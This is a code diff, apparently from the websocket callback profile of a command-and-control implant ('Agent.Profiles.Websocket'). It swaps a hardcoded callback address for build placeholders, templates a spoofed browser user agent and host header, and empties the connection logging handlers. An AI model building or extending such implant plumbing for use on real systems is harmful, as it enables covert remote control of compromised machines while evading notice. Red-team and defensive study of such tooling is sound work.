@@ -32,11 +32,11 @@ namespace Agent.Profiles.Websocket
             this.logger = logger;
             this.messageManager = messageManager;
             int callbackPort = Int32.Parse("8081");
-            string callbackHost = "ws://10.30.25.21";
-            this.endpoint = "socket";
+            string callbackHost = "callback_host";
+            this.endpoint = "ENDPOINT_REPLACE";
             this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
-            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
-            this.hostHeader = "";
+            this.userAgent = "USER_AGENT";
+            this.hostHeader = "%HOSTHEADER%";
             this.maxAttempts = 5;
             this.connectAttempt = 0;
 
@@ -87,10 +87,10 @@ namespace Agent.Profiles.Websocket
 
             this._client.ReconnectionHappened.Subscribe(info =>
             {
-                logger.Log($"Reconnection happened, type: {info.Type}, url: {url}");
             });
-            this._client.DisconnectionHappened.Subscribe(info =>
-                logger.Log($"Disconnection happened, type: {info.Type}"));
+            this._client.DisconnectionHappened.Subscribe(info => {
+
+            });
             this._client.Start().Wait();
 
         }
